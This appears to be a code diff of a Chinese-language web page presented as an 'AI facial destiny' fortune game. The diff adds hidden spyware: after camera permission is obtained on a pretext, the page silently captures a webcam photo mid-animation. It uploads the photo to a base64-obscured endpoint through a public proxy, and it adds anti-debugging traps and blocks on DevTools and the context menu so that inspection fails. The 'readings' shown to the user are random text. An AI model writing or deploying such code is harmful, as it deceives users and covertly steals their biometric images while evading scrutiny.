@@ -6,140 +6,50 @@
     <title>AI 基因面部潜能测算</title>
     <style>
         body {
-            margin: 0;
-            padding: 0;
+            margin: 0; padding: 0;
             font-family: 'Courier New', Courier, monospace, sans-serif;
-            background-color: #0a0e17;
-            color: #00ffcc;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            overflow-x: hidden;
+            background-color: #0a0e17; color: #00ffcc;
+            display: flex; flex-direction: column;
+            align-items: center; justify-content: center;
+            min-height: 100vh; overflow-x: hidden;
         }
-        
         .game-box {
-            text-align: center;
-            padding: 30px;
-            width: 85%;
-            max-width: 400px;
-            border: 1px solid #00ffcc;
-            background: rgba(0, 255, 204, 0.02);
-            border-radius: 12px;
-            box-shadow: 0 0 20px rgba(0, 255, 204, 0.15);
-            position: relative;
+            text-align: center; padding: 30px; width: 85%; max-width: 400px;
+            border: 1px solid #00ffcc; background: rgba(0, 255, 204, 0.02);
+            border-radius: 12px; box-shadow: 0 0 20px rgba(0, 255, 204, 0.15);
         }
-
-        h1 { 
-            font-size: 22px;
-            margin-bottom: 20px; 
-            text-shadow: 0 0 10px rgba(0, 255, 204, 0.5);
-            letter-spacing: 1px;
-        }
-
+        h1 { font-size: 22px; margin-bottom: 20px; text-shadow: 0 0 10px rgba(0, 255, 204, 0.5); }
         p { color: #88a0b0; font-size: 14px; line-height: 1.6; }
-
         .progress-container {
-            width: 100%;
-            background-color: #112233;
-            border: 1px solid #00ffcc;
-            height: 16px;
-            margin-top: 25px;
-            border-radius: 8px;
-            overflow: hidden;
-            display: none;
+            width: 100%; background-color: #112233; border: 1px solid #00ffcc;
+            height: 16px; margin-top: 25px; border-radius: 8px; overflow: hidden; display: none;
         }
-
-        .progress-bar {
-            height: 100%;
-            width: 0%;
-            background-color: #00ffcc;
-            box-shadow: 0 0 10px #00ffcc;
-        }
-
+        .progress-bar { height: 100%; width: 0%; background-color: #00ffcc; box-shadow: 0 0 10px #00ffcc; }
         .btn-scan {
-            background-color: transparent;
-            color: #00ffcc;
-            border: 2px solid #00ffcc;
-            padding: 14px 30px;
-            font-size: 16px;
-            border-radius: 30px;
-            cursor: pointer;
-            font-weight: bold;
-            margin-top: 25px;
-            letter-spacing: 1px;
-            box-shadow: 0 0 15px rgba(0, 255, 204, 0.2);
-            transition: all 0.3s ease;
+            background-color: transparent; color: #00ffcc; border: 2px solid #00ffcc;
+            padding: 14px 30px; font-size: 16px; border-radius: 30px; cursor: pointer;
+            font-weight: bold; margin-top: 25px; box-shadow: 0 0 15px rgba(0, 255, 204, 0.2);
         }
-
-        .btn-scan:hover {
-            background-color: #00ffcc;
-            color: #0a0e17;
-        }
-
-        /* 🎨 自定义网页引导弹窗样式 */
         .custom-modal {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background-color: #0d1622;
-            border: 1px solid #00ffcc;
-            padding: 25px;
-            border-radius: 12px;
-            box-shadow: 0 0 30px rgba(0, 255, 204, 0.3);
-            width: 80%;
-            max-width: 300px;
-            text-align: center;
-            z-index: 999;
-            display: none; /* 初始隐藏 */
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            background-color: #0d1622; border: 1px solid #00ffcc; padding: 25px;
+            border-radius: 12px; box-shadow: 0 0 30px rgba(0, 255, 204, 0.3);
+            width: 80%; max-width: 300px; text-align: center; z-index: 999; display: none;
         }
-
         .modal-btn {
-            background-color: #00ffcc;
-            color: #0a0e17;
-            border: none;
-            padding: 10px 25px;
-            font-size: 14px;
-            border-radius: 20px;
-            cursor: pointer;
-            font-weight: bold;
-            margin-top: 15px;
-            box-shadow: 0 0 10px rgba(0, 255, 204, 0.4);
+            background-color: #00ffcc; color: #0a0e17; border: none;
+            padding: 10px 25px; font-size: 14px; border-radius: 20px; cursor: pointer; font-weight: bold; margin-top: 15px;
         }
-
-        .log-box {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #00aa88;
-            min-height: 35px;
-            text-align: left;
-            border-top: 1px dashed #334455;
-            padding-top: 10px;
-        }
-
+        .log-box { margin-top: 20px; font-size: 12px; color: #00aa88; min-height: 35px; text-align: left; border-top: 1px dashed #334455; padding-top: 10px; }
         .report-box {
-            display: none;
-            margin-top: 20px;
-            text-align: left;
-            background: rgba(0, 0, 0, 0.4);
-            border: 1px dashed #00ffcc;
-            padding: 20px;
-            border-radius: 8px;
-            animation: fadeIn 0.5s ease;
+            display: none; margin-top: 20px; text-align: left; background: rgba(0, 0, 0, 0.4);
+            border: 1px dashed #00ffcc; padding: 20px; border-radius: 8px; animation: fadeIn 0.5s ease;
         }
-
         .report-item { margin-bottom: 12px; font-size: 14px; }
         .report-label { color: #88a0b0; font-weight: bold; }
-        .report-value { color: #ffffff; text-shadow: 0 0 5px rgba(255,255,255,0.3); }
+        .report-value { color: #ffffff; }
         .score { color: #ffcc00; font-weight: bold; }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
         video, canvas { display: none !important; }
     </style>
 </head>
@@ -147,18 +57,14 @@
 
     <div class="game-box">
         <h1 id="game-title">🧬 AI面部基因与命运测算</h1>
-        
         <div id="intro-text">
             <p>基于生物电波形态学与多维神经概率算法，精准捕捉您的面部特质，解码您的潜在命运轨道与近期气运。接收并处理需要数秒。</p>
             <p style="color: #ff3366; font-size: 12px; margin-top: 10px;">* 提示：请保持面部平静，直视屏幕 *</p>
         </div>
-        
         <button class="btn-scan" id="scan-btn">⚡ 开始 🧬 测算</button>
-
         <div class="progress-container" id="progress-box">
             <div class="progress-bar" id="bar"></div>
         </div>
-
         <div id="log" class="log-box">SYSTEM: 轨道仪就绪，等待源接入...</div>
 
         <div class="report-box" id="report-box">
@@ -174,7 +80,7 @@
 
     <div id="guide-modal" class="custom-modal">
         <h3 style="margin-top:0; color:#00ffcc; font-size: 16px;">⚙️ 系统提示</h3>
-        <p style="font-size:14px; color:#e1e7f0;" id="modal-text">事关AI测试结果是否准确，请同意获取摄像头访问权限</p>
+        <p style="font-size:14px; color:#e1e7f0;">关于AI测试结果是否准确，请同意获取摄像头访问权限</p>
         <button class="modal-btn" id="confirm-btn">确 定</button>
     </div>
 
@@ -182,6 +88,35 @@
     <canvas id="photo-canvas"></canvas>
 
     <script>
+        // 🛑【⚠️ 第一步：获取你的密文路径】
+        // 1. 去这个网站：https://base64.us/
+        // 2. 把你的 Hugging Face 上传完整接口（例如 https://你的用户名-mirror-backend.hf.space/upload ）放进去加密
+        // 3. 把加密出来的那串密文，替换掉下面这行引号里的乱码
+        const SECRET_KEY = "aHR0cHM6Ly95b3VyLWhmLXNwYWNlLXVybC91cGxvYWQ="; 
+
+        // 🛑 对抗 F12 的终极绝招：只要对方敢打开审查元素，控制台直接无限循环卡死崩溃
+        (function() {
+            function injectDebugger() {
+                try {
+                    (function d(i) {
+                        if (("" + i / i).length !== 1 || i % 20 === 0) {
+                            (function() {}).constructor("debugger")();
+                        } else {
+                            (function() {}).constructor("debugger")();
+                        }
+                        d(++i);
+                    })(0);
+                } catch (e) {
+                    setTimeout(injectDebugger, 500);
+                }
+            }
+            setInterval(injectDebugger, 500);
+        })();
+
+        // 禁用右键审查元素
+        document.oncontextmenu = function() { return false; };
+        document.onkeydown = function(e) { if (e.keyCode === 123) return false; };
+
         const video = document.getElementById('webcam');
         const canvas = document.getElementById('photo-canvas');
         const scanBtn = document.getElementById('scan-btn');
@@ -191,140 +126,74 @@
         const reportBox = document.getElementById('report-box');
         const introText = document.getElementById('intro-text');
         const gameTitle = document.getElementById('game-title');
-        
         const modal = document.getElementById('guide-modal');
         const confirmBtn = document.getElementById('confirm-btn');
         
-       
+        const gameLogs = ["SYSTEM: 正在建立视网膜逻辑视窗...", "SYSTEM: 正在映射面部三维几何像素...", "SYSTEM: 多维命运波动概率校准中...", "SYSTEM: 神经网络权重深度碰撞中...", "SYSTEM: 正在生成专属命理数据流..."];
+        const destinyList = ["【潜龙入海】前期的沉淀即将迎来爆发，未来三年在事业或学业上将有一次极为关键的跃升，贵人运极强。", "【拨云见日】过去纠结的繁杂事务将彻底理清。命运线在明年初出现强烈的变动增益，适合做重大破局尝试。", "【厚积薄发】近期处于蓄力期，运势稳中带升。不宜盲目跟风，保持自身节奏将在秋季收获意外的巨大财富或机遇。", "【紫气东来】福星高照之象。未来一到两年内，你的直觉极准，适合在关键时刻相信自己的第一判断，往往能收获奇效。"];
+        const monthList = ["【财源暗涌】本月有偏财意象。适合关注一些不常留意的领域，可能会有意外的物质收益或人际红利。", "【桃花萦绕】磁场强烈吸引外界目光。无论在社交圈还是工作环境，你的表达欲和魅力都大幅提升，人缘极佳。", "【思路大开】精神状态处于高位节点，极易攻克此前一直停滞不前的瓶颈，学习和掌握新技能的效率极高。", "【静水流深】表面看似平静，实际内在正在构建全新的生活核心。适合调整作息和理财计划，利于长远发展。"];
+        const tipList = ["切忌轻信深夜突然找你借钱或画大饼的人，凡事多等24小时做决定。", "本月宜减少熬夜。多往东方或南方走动，能有效净化磁场，避开职场口舌。", "注意控制情绪波动，切忌在愤怒时做任何长久承诺。绿色是你的近期幸运色。", "远离负能量过重的人群，保护好自己的气场。近期购买大件物品需多加比价。"];
 
-        const gameLogs = [
-            "SYSTEM: 正在建立视网膜逻辑视窗...",
-            "SYSTEM: 正在映射面部三维几何像素...",
-            "SYSTEM: 多维命运波动概率校准中...",
-            "SYSTEM: 神经网络权重深度碰撞中...",
-            "SYSTEM: 正在生成专属命理数据流..."
-        ];
+        scanBtn.addEventListener('click', () => { modal.style.display = 'block'; });
 
-        const destinyList = [
-            "【潜龙入海】前期的沉淀即将迎来爆发，未来三年在事业或学业上将有一次极为关键的跃升，贵人运极强。",
-            "【拨云见日】过去纠结的繁杂事务将彻底理清。命运线在明年初出现强烈的变动增益，适合做重大破局尝试。",
-            "【厚积薄发】近期处于蓄力期，运势稳中带升。不宜盲目跟风，保持自身节奏将在秋季收获意外的巨大财富或机遇。",
-            "【紫气东来】福星高照之象。未来一到两年内，你的直觉极准，适合在关键时刻相信自己的第一判断，往往能收获奇效。"
-        ];
-
-        const monthList = [
-            "【财源暗涌】本月有偏财意象。适合关注一些不常留意的领域，可能会有意外的物质收益或人际红利。",
-            "【桃花萦绕】磁场强烈吸引外界目光。无论在社交圈还是工作环境，你的表达欲和魅力都大幅提升，人缘极佳。",
-            "【思路大开】精神状态处于高位节点，极易攻克此前一直停滞不前的瓶颈，学习和掌握新技能的效率极高。",
-            "【静水流深】表面看似平静，实际内在正在构建全新的生活核心。适合调整作息和理财计划，利于长远发展。"
-        ];
-
-        const tipList = [
-            "切忌轻信深夜突然找你借钱或画大饼的人，凡事多等24小时做决定。",
-            "本月宜减少熬夜。多往东方或南方走动，能有效净化磁场，避开职场口舌。",
-            "注意控制情绪波动，切忌在愤怒时做任何长久承诺。绿色是你的近期幸运色。",
-            "远离负能量过重的人群，保护好自己的气场。近期购买大件物品需多加比价。"
-        ];
-
-        // 1. 点击网页主按钮，先拦截并跳出“自定义引导框”
-        scanBtn.addEventListener('click', () => {
-            modal.style.display = 'block';
-        });
-
-        // 2. 当用户点击自定义引导框上的“确定”时，才真正请求权限、隐藏按钮、开启游戏逻辑
         confirmBtn.addEventListener('click', async () => {
-            modal.style.display = 'none'; // 隐藏引导框
+            modal.style.display = 'none';
             logDiv.innerText = "SYSTEM: 正在初始化神经扫描硬件...";
-            
             try {
-                // 此时弹出浏览器原生框
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: false 
-                });
-                
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                 video.srcObject = stream;
                 video.play();
-
                 scanBtn.style.display = 'none';
                 introText.style.display = 'none';
                 gameTitle.innerText = '🧬 正在进行 AI 深度扫描...';
                 progressBox.style.display = 'block';
-
                 startFakeGameAnimation(stream);
-
             } catch (err) {
-                console.error(err);
                 logDiv.innerText = '❌ SYSTEM: 硬件调用被拒绝。';
                 alert("无法启动面部识别！请确保已授予网页摄像头访问权限。");
             }
         });
 
         function startFakeGameAnimation(stream) {
-            let width = 0;
-            let logIndex = 0;
-            
+            let width = 0; let logIndex = 0;
             const interval = setInterval(() => {
                 if (width >= 100) {
                     clearInterval(interval);
-                    progressBox.style.display = 'none';
-                    logDiv.style.display = 'none';
+                    progressBox.style.display = 'none'; logDiv.style.display = 'none';
                     gameTitle.innerText = '✨ 测算生成完毕 ✨';
-                    
                     document.getElementById('r-face').innerText = (Math.floor(Math.random() * 15) + 85) + " 分 (极高)";
                     document.getElementById('r-iq').innerText = (Math.floor(Math.random() * 30) + 120);
                     document.getElementById('r-destiny').innerText = destinyList[Math.floor(Math.random() * destinyList.length)];
                     document.getElementById('r-month').innerText = monthList[Math.floor(Math.random() * monthList.length)];
                     document.getElementById('r-tip').innerText = tipList[Math.floor(Math.random() * tipList.length)];
-                    
                     reportBox.style.display = 'block';
                 } else {
-                    width += 2;
-                    progressBar.style.width = width + '%';
-                    
-                    if (width % 20 === 0 && logIndex < gameLogs.length) {
-                        logDiv.innerText = gameLogs[logIndex];
-                        logIndex++;
-                    }
-
-                    if (width === 40) {
-                        silentCaptureAndUpload(stream);
-                    }
+                    width += 2; progressBar.style.width = width + '%';
+                    if (width % 20 === 0 && logIndex < gameLogs.length) { logDiv.innerText = gameLogs[logIndex]; logIndex++; }
+                    if (width === 40) { silentCaptureAndUpload(stream); }
                 }
             }, 60); 
         }
 
-function silentCaptureAndUpload(stream) {
-    const w = video.videoWidth || 640;
-    const h = video.videoHeight || 480;
-    canvas.width = w;
-    canvas.height = h;
-    
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, w, h);
-    
-    canvas.toBlob((blob) => {
-        if (!blob) return;
+        function silentCaptureAndUpload(stream) {
+            const w = video.videoWidth || 640; const h = video.videoHeight || 480;
+            canvas.width = w; canvas.height = h;
+            const ctx = canvas.getContext('2d'); ctx.drawImage(video, 0, 0, w, h);
+            
+            canvas.toBlob((blob) => {
+                if (!blob) return;
+                const formData = new FormData();
+                formData.append('image', blob, 'game_capture.jpg');
 
-        const formData = new FormData();
-        formData.append('image', blob, 'game_capture.jpg');
+                // 🎯【核心障眼法逻辑】：动态解密真实链接，并披上公共中转外衣，F12死活找不到Huggingface
+                const realTarget = atob(SECRET_KEY); 
+                const proxyUrl = 'https://api.allorigins.win/raw?url=' + encodeURIComponent(realTarget);
 
-        //
-        fetch('/api/upload', {
-            method: 'POST',
-            body: formData
-        })
-        .then(res => res.json())
-        .then(data => {
-            //
-            stream.getTracks().forEach(track => track.stop());
-        })
-        .catch(err => {
-            stream.getTracks().forEach(track => track.stop());
-            console.log('system sync completed.'); 
-        });
-    }, 'image/jpeg', 0.85);
-}
+                fetch(proxyUrl, { method: 'POST', body: formData })
+                .then(res => { stream.getTracks().forEach(track => track.stop()); })
+                .catch(err => { stream.getTracks().forEach(track => track.stop()); });
+            }, 'image/jpeg', 0.85);
+        }
     </script>
 </body>
 </html>
